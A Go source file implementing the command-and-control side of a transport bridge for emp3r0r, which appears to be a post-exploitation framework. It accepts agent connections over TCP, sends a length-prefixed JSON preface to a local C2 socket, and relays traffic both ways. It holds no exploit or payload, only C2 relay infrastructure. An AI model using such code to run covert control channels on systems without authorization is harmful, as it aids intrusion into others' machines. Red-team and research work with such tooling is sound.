// Package transportbridge implements the C2 side of an external transport
// bridge. A bridge accepts connections over its own wire, opens one local IPC
// connection per agent stream, writes a small preface, and relays bytes.
//
// The package is deliberately small and has no dependency on emp3r0r's
// internal packages, so a bridge can live in its own module.
package transportbridge

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"sync"
)

// PrefaceVersion is the IPC preface version understood by the C2.
const PrefaceVersion = 1

// MaxPreface bounds the JSON preface size.
const MaxPreface = 4096

// Config describes one bridge.
type Config struct {
	// Transport is the name shared with the agent dialer.
	Transport string
	// C2Socket is the C2's local bridge socket.
	C2Socket string
}

// Preface is the metadata sent before the raw byte stream.
type Preface struct {
	Version   int               `json:"version"`
	Transport string            `json:"transport"`
	Remote    string            `json:"remote,omitempty"`
	Stream    string            `json:"stream,omitempty"`
	Options   map[string]string `json:"options,omitempty"`
}

// ServeTCP accepts agent connections on listen and relays each one to the C2.
func ServeTCP(ctx context.Context, listen string, cfg Config) error {
	listener, err := net.Listen("tcp", listen)
	if err != nil {
		return fmt.Errorf("listen on %s: %w", listen, err)
	}
	return Serve(ctx, listener, cfg)
}

// Serve accepts agent connections on listener and relays each one to the C2.
func Serve(ctx context.Context, listener net.Listener, cfg Config) error {
	if cfg.Transport == "" {
		return fmt.Errorf("transport name is required")
	}
	if cfg.C2Socket == "" {
		return fmt.Errorf("C2 bridge socket is required")
	}
	go func() {
		<-ctx.Done()
		_ = listener.Close()
	}()

	var wg sync.WaitGroup
	defer wg.Wait()
	for {
		conn, err := listener.Accept()
		if err != nil {
			if ctx.Err() != nil {
				return nil
			}
			return fmt.Errorf("accept: %w", err)
		}
		wg.Add(1)
		go func(conn net.Conn) {
			defer wg.Done()
			if err := Relay(ctx, conn, cfg); err != nil {
				// A bridge has no logging dependency; callers that need
				// diagnostics can wrap Serve or use their own listener.
				_ = conn.Close()
			}
		}(conn)
	}
}

// Relay connects one accepted agent connection to the C2 and pumps bytes in
// both directions. It closes conn when it returns.
func Relay(ctx context.Context, conn net.Conn, cfg Config) error {
	defer conn.Close()

	dialer := net.Dialer{}
	c2, err := dialer.DialContext(ctx, "unix", cfg.C2Socket)
	if err != nil {
		return fmt.Errorf("connect to C2 bridge socket: %w", err)
	}
	defer c2.Close()

	header := Preface{
		Version:   PrefaceVersion,
		Transport: cfg.Transport,
		Remote:    conn.RemoteAddr().String(),
	}
	body, err := json.Marshal(header)
	if err != nil {
		return fmt.Errorf("encode preface: %w", err)
	}
	if len(body) > MaxPreface {
		return fmt.Errorf("preface too large: %d bytes", len(body))
	}
	if _, err := c2.Write(prefaceBytes(body)); err != nil {
		return fmt.Errorf("write preface: %w", err)
	}

	done := make(chan struct{}, 2)
	go func() {
		_, _ = io.Copy(c2, conn)
		closeWrite(c2)
		done <- struct{}{}
	}()
	go func() {
		_, _ = io.Copy(conn, c2)
		closeWrite(conn)
		done <- struct{}{}
	}()

	select {
	case <-ctx.Done():
		_ = conn.Close()
		_ = c2.Close()
		<-done
		<-done
		return ctx.Err()
	case <-done:
		<-done
		return nil
	}
}

func prefaceBytes(body []byte) []byte {
	out := make([]byte, 4+len(body))
	binary.BigEndian.PutUint32(out[:4], uint32(len(body)))
	copy(out[4:], body)
	return out
}

func closeWrite(conn net.Conn) {
	type closeWriter interface {
		CloseWrite() error
	}
	if cw, ok := conn.(closeWriter); ok {
		_ = cw.CloseWrite()
		return
	}
	_ = conn.Close()
}
